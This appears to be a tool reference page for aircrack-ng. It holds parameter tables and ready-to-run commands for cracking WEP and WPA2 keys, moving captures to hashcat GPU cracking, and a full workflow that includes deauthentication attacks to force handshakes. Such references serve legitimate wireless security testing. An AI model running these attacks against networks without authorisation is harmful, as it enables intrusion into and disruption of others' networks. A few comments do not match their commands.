# Aircrack-ng

- **Category**: Wireless / Password Cracking
- **Risk Level**: 🔴 High

---

## Description

aircrack-ng is the core tool of the aircrack-ng suite, used to crack WEP and WPA/WPA2-PSK wireless encryption keys. For WEP, it uses statistical attacks (PTW algorithm); for WPA/WPA2, it uses dictionary attacks to perform offline brute-force against captured four-way handshakes (EAPOL). It also supports multiple hash formats and can be used alongside hashcat/john.

## Installation

```bash
sudo apt install aircrack-ng
```

## Parameter Reference

| Parameter | Description |
|------|------|
| `-w <wordlist>` | Path to wordlist(s) filename(s) |
| `-b <bssid>` | Target selection: access point's MAC |
| `-e <essid>` | Target selection: network identifier |
| `-l <file>` | Write the found key to a file |
| `-q` | Quiet mode, reduced output |
| `-p <nbcpu>` | Number of CPUs to use (default: all) |
| `-s` | Show the key in ASCII while cracking |
| `-n <nbits>` | WEP key length (64/128/152/256) |
| `-i <index>` | WEP key index (1 to 4), default: any |
| `-f <fudge>` | Brute-force fudge factor (default: 2) |
| `-k <korek>` | Disable one attack method (1 to 17) |
| `-a <mode>` | Force attack mode (1=WEP, 2=WPA) |
| `-r <database>` | Path to airolib-ng database (cannot be used with `-w`) |
| `--bssid` | Same as `-b` |
| `-c` | Search only alphanumeric characters |

## Common Commands

### Scenario 1: Crack WPA2-PSK (Dictionary Attack)

```bash
# Basic dictionary attack (requires handshake captured first with airodump-ng)
# -w: dictionary file, -b: target AP MAC
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF /tmp/capture-01.cap

# Also specify SSID (to differentiate among multiple targets)
aircrack-ng -w /usr/share/wordlists/rockyou.txt -e "TargetWiFi" /tmp/capture-01.cap

# Use multiple dictionary files (comma-separated)
aircrack-ng -w /path/to/dict1.txt,/path/to/dict2.txt -b AA:BB:CC:DD:EE:FF /tmp/capture-01.cap
```

### Scenario 2: Crack WEP

```bash
# WEP cracking (requires sufficient IVs, typically >20,000)
aircrack-ng /tmp/wep_capture-01.cap

# Specify key length to speed up
aircrack-ng -n 64 /tmp/wep_capture-01.cap

# Use a higher fudge factor (when IVs are insufficient)
aircrack-ng -n 128 -f 5 /tmp/wep_capture-01.cap
```

### Scenario 3: Verify a Handshake

```bash
# Check whether the cap file contains a valid handshake
aircrack-ng /tmp/capture-01.cap
# Output: "1 handshake" means capture succeeded

aircrack-ng -w /tmp/small_wordlist.txt -b AA:BB:CC:DD:EE:FF -l /tmp/key.txt /tmp/capture-01.cap
```

### Scenario 4: Convert to hashcat Format

```bash
# Convert cap file to hccapx format supported by hashcat
# Note: cap2hccapx is deprecated; use hcxpcapngtool (from hcxtools) for both workflows
hcxpcapngtool -o /tmp/capture.22000 /tmp/capture-01.cap
hashcat -m 22000 /tmp/capture.22000 /usr/share/wordlists/rockyou.txt

# Legacy hccapx format (hashcat mode 2500, now deprecated in hashcat ≥6.0)
# cap2hccapx /tmp/capture-01.cap /tmp/capture.hccapx
# hashcat -m 2500 /tmp/capture.hccapx /usr/share/wordlists/rockyou.txt
```

### Scenario 5: GPU-Accelerated Cracking (via hashcat)

```bash
# WPA/WPA2 CPU cracking (slow, but no GPU required)
aircrack-ng -w rockyou.txt capture.cap

# Hand off to hashcat for GPU cracking (recommended, 100x+ faster)
hcxpcapngtool -o hash.22000 capture.cap
hashcat -m 22000 -a 0 hash.22000 rockyou.txt
hashcat -m 22000 -a 3 hash.22000 "?l?l?l?l?l?l?l?l"  # Brute-force 8-char lowercase
```

### Full Attack Workflow

```bash
# 1. Enable monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# 2. Scan for targets
sudo airodump-ng wlan0mon
# Record target: BSSID=AA:BB:CC:DD:EE:FF, CH=6

# 3. Start targeted capture (run in its own terminal; remove trailing & to keep it foreground)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w /tmp/target wlan0mon

# 4. Open a second terminal and send Deauth to force handshake
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# 5. Wait for "WPA handshake" to appear, then crack
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF /tmp/target-01.cap
```

## Notes & Tips

1. WPA/WPA2 cracking is entirely dependent on dictionary quality; complex passwords may not be crackable
2. `rockyou.txt` on Kali may need decompression first: `gunzip /usr/share/wordlists/rockyou.txt.gz` (modern Kali 2023+ ships it pre-extracted)
3. For long cracking sessions, hashcat + GPU is strongly preferred over aircrack-ng — it can be tens to hundreds of times faster
4. PMKID attacks (via hcxdumptool) do not require waiting for a client to connect, making them more efficient than traditional handshake capture
5. WPA3 (SAE) cannot be cracked by these methods

---

## Official References

- [aircrack-ng Documentation](https://www.aircrack-ng.org/doku.php?id=aircrack-ng)
- [Aircrack-ng Documentation](https://www.aircrack-ng.org/documentation.html)
- [aircrack-ng (GitHub)](https://github.com/aircrack-ng/aircrack-ng)
